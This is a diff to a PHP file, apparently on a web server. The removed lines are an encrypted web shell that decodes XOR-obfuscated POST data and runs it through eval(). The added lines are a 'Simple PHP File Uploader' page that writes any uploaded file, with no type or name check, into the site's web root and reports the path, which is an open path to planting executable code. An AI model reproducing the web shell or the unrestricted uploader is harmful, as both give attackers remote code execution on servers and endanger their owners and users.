@@ -1,34 +1,78 @@
-<?php
-    session_start();
-    @set_time_limit(0);
-	@error_reporting(0);
-    function E($D,$K){
-        for($i=0;$i<strlen($D);$i++) {
-            $D[$i] = $D[$i]^$K[$i+1&15];
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple PHP File Uploader</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
         }
-        return $D;
-    }
-    function Q($D){
-        return base64_encode($D);
-    }
-    function O($D){
-        return base64_decode($D);
-    }
-    $P='123';
-    $V='payload';
-    $T='202cb962ac59075b';
-    if (isset($_POST[$P])){
-        $F=O(E(O($_POST[$P]),$T));
-        if (isset($_SESSION[$V])){
-            $L=$_SESSION[$V];
-            $A=explode('|',$L);
-            class C{public function nvoke($p) {eval($p."");}}
-            $R=new C();
-			$R->nvoke($A[0]);
-            echo substr(md5($P.$T),0,16);
-            echo Q(E(@run($F),$T));
-            echo substr(md5($P.$T),16);
-        }else{
-            $_SESSION[$V]=$F;
+        .upload-container {
+            text-align: center;
+            padding: 40px;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
         }
-    }
+        input[type="file"] {
+            margin-top: 10px;
+            padding: 10px;
+        }
+        input[type="submit"] {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+        }
+        p {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="upload-container">
+        <h1>PHP File Uploader</h1>
+        <form action="upload.php" method="post" enctype="multipart/form-data">
+            <input type="file" name="fileToUpload" /><br />
+            <input type="submit" value="Upload File" name="submit" />
+        </form>
+
+        <?php
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            $targetDir = "/home/site/wwwroot/wwwroot/";
+            $targetFile = $targetDir . basename($_FILES["fileToUpload"]["name"]);
+            $uploadOk = 1;
+
+            // Check if file was selected
+            if (!empty($_FILES["fileToUpload"]["name"])) {
+                // Check if file was uploaded without errors
+                if ($_FILES["fileToUpload"]["error"] === 0) {
+                    // Attempt to move the uploaded file to the target directory
+                    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
+                        echo "<p>File uploaded successfully to: " . htmlspecialchars($targetFile) . "</p>";
+                    } else {
+                        echo "<p>Error: There was an error uploading your file.</p>";
+                    }
+                } else {
+                    echo "<p>Error: File upload error. Code: " . $_FILES["fileToUpload"]["error"] . "</p>";
+                }
+            } else {
+                echo "<p>Please select a file to upload.</p>";
+            }
+        }
+        ?>
+    </div>
+</body>
+</html>
